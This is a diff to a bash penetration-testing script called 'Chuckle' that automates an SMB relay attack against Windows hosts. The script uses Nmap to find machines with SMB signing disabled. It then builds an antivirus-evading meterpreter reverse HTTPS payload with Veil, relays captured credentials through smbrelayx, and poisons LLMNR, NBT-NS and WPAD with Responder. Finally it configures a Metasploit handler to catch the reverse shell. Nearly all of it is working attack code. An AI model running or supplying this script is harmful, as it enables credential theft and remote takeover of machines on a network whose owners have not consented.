@@ -10,7 +10,7 @@
 #Released under Apache V2 see LICENCE for more information
 #
 #Requires Nmap, Responder, SMBRelayX, Latest version of Veil, metasploit.
-trap 'kill $(jobs -p)'  EXIT
+trap 'kill $(jobs -p)' EXIT
 clear
 echo "_________ .__                   __   .__          "
 echo "\_   ___ \|  |__  __ __   ____ |  | _|  |   ____  "
@@ -35,7 +35,7 @@ command -v msfconsole >/dev/null 2>&1 || { echo "msfconsole required but not ins
 
 #determine which version of Responder is being used.
 if responder --version|grep 2.1>/dev/null; then
-        newresver=0
+	newresver=0
 	echo "Using Responder 2.1.*"
 else
 	newresver=1
@@ -67,7 +67,7 @@ for ip in $(grep open chuckle.gnmap |cut -d " " -f 2 ); do
   lines=$(egrep -A 15 "for $ip$" chuckle.nmap |grep disabled |wc -l)
   if [ $lines -gt 0 ]; then
     if [ $shownbt -gt 0 ]; then
-      nbtname=$(nbtscan  $ip | awk -F" " '{print $2}')
+      nbtname=$(nbtscan $ip | awk -F" " '{print $2}' | tail -1)
       echo "$ip($nbtname)" >> ./chuckle.hosts
     else
       echo "$ip" >> ./chuckle.hosts
@@ -99,15 +99,26 @@ echo "Please enter local port for reverse connection:"
 read port
 echo "Meterpreter shell will connect back to $lhost on port $port"
 echo "Generating Payload..."
-payload=$(veil-evasion -p go/meterpreter/rev_https -c LHOST=$lhost LPORT=$port -o $target 2>/dev/null|grep exe |cut -d " " -f6|sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g")
+payload=$(veil-evasion -p cs/meterpreter/rev_https -c LHOST=$lhost LPORT=$port -o $target 2>/dev/null|grep exe |cut -d " " -f6|sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g")
 echo "Payload created: $payload"
-echo "Starting SMBRelayX..."
+echo "Starting SMBRelayX and targetting $target with the payload $payload"
 smbrelayx.py -h $target -e $payload  >> ./chuckle.log  &
 sleep 2
-echo "Starting Responder..."
+echo "Starting Responder with the following options:
+
+-w (Start the WPAD rogue proxy server)
+-r (Answer to the Workstation Service request name suffix)
+-f (Fingerprint every host who issued an LLMNR/NBT-NS query)
+-F (Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt on the target)
+-I (lhost $lost)
+
+The active "coaxing" of a user works as follows:
+
+A workstation will periodically search for WPAD. If a location is not provided by a DHCP or DNS server, then Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) queries are sent out on the local network segment. When Responder is active on a network, it will respond to these requests and send a specific wpad.dat file to the targeted browser. A command line switch "-F" was added to provide to force NTLM authentication when a browser wants to retrieve the wpad.dat file.
+"
 if [ $newresver -gt 0 ]; then
 	#New Responder
-	responder -I $(netstat -ie | grep -B1 $lhost  | head -n1 | awk '{print $1}') -wrfF >>chuckle.log &	
+	responder -I $(netstat -ie | grep -B1 $lhost  | head -n1 | awk '{print $1}' | tr -d :) -wrfF >>chuckle.log &	
 else
 	#Old Responder.
 	responder -i $lhost -wrfF >>chuckle.log &
@@ -118,6 +129,6 @@ echo "set payload windows/meterpreter/reverse_https" >> chuckle.rc
 echo "set LHOST $lhost" >> chuckle.rc
 echo "set LPORT $port" >> chuckle.rc
 echo "set autorunscript post/windows/manage/migrate" >> chuckle.rc
+echo "set ExitOnSession false" >> chuckle.rc
 echo "exploit -j" >> chuckle.rc
 msfconsole -q -r ./chuckle.rc
-
